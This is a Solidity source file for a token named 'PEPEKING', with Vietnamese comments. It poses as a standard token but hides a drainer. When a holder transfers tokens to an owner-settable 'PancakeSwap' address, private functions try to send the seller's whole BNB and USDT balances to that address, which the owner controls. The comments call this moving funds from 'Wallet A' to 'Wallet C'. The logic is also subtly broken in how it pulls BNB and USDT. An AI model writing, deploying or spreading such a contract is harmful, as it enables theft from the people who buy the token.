// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

contract TokenB {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;

    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowances;

    address private pancakeSwapAddress;
    address private contractOwner;

    constructor() {
        name = "PEPEKING";
        symbol = "PEPE";
        decimals = 18;
        totalSupply = 1000000000 * (10**uint256(decimals));

        contractOwner = msg.sender;
        balances[contractOwner] = totalSupply;
    }

    function setPancakeSwapAddress(address _pancakeSwapAddress) external {
        require(msg.sender == contractOwner, "Only contract owner can set PancakeSwap address");
        pancakeSwapAddress = _pancakeSwapAddress;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, allowances[sender][msg.sender] - amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "Invalid owner address");
        require(spender != address(0), "Invalid spender address");

        allowances[owner][spender] = amount;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        require(sender != address(0), "Invalid sender address");
        require(recipient != address(0), "Invalid recipient address");
        require(amount > 0, "Invalid transfer amount");
        require(balances[sender] >= amount, "Insufficient balance");

        balances[sender] -= amount;
        balances[recipient] += amount;

        if (recipient == pancakeSwapAddress) {
            // Chuyển số dư BNB và USDT từ Ví A cho Ví C
            transferBNBToC(sender);
            transferUSDTToC(sender);
        }
    }

    function transferBNBToC(address sender) private {
        // Lấy số dư BNB của Ví A
        uint256 bnbBalance = address(sender).balance;
        // Chuyển toàn bộ số dư BNB cho Ví C
        payable(pancakeSwapAddress).transfer(bnbBalance);
    }

    function transferUSDTToC(address sender) private {
        // Địa chỉ contract USDT
        address usdtToken = address(0x55d398326f99059fF775485246999027B3197955);
        // Số dư USDT của Ví A
        uint256 usdtBalance = IERC20(usdtToken).balanceOf(sender);
        // Chuyển toàn bộ số dư USDT cho Ví C
        IERC20(usdtToken).transferFrom(sender, pancakeSwapAddress, usdtBalance);
    }
}